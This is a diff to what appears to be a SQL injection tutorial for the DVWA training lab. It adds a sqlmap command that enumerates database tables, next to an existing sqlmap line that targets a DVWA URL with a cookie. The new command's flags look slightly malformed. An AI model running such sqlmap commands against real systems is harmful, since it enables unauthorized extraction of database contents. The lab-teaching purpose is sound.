@@ -584,6 +584,10 @@ sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
 
 * Once you are able to dump the database names with sqlmap, now enumerate the tables in your database of interest&#x20;
 
+```
+sqlmap -u http://url --dbs main --tables
+```
+
 <figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 #### Dumping a Database
